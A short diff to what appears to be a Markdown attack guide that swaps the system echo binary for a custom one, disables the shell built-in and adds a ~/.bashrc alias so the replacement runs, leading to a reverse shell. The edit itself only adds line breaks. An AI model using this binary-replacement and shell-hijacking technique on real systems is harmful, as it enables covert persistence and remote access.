@@ -53,9 +53,9 @@
        
        ```mv `which echo` /tmp/.tmpecho; cp custom-echo /usr/bin/echo```
        
-     - [x] but it'll still not work because echo is a shell-built-in, means it doesn't require any external binary to work in Linux<br /> To fix this, use the following commands:
-            ```enable -n echo```
-            ```echo "alias echo='/usr/bin/echo'" >> ~/.bashrc```
+     - [x] but it'll still not work because echo is a shell-built-in, means it doesn't require any external binary to work in Linux<br /> To fix this, use the following commands:<br />
+            ```enable -n echo```<br />
+            ```echo "alias echo='/usr/bin/echo'" >> ~/.bashrc```<br />
      - [x] Now we're ready to get our reverse shell. Let's see it in action. < 3
 
 -----------------
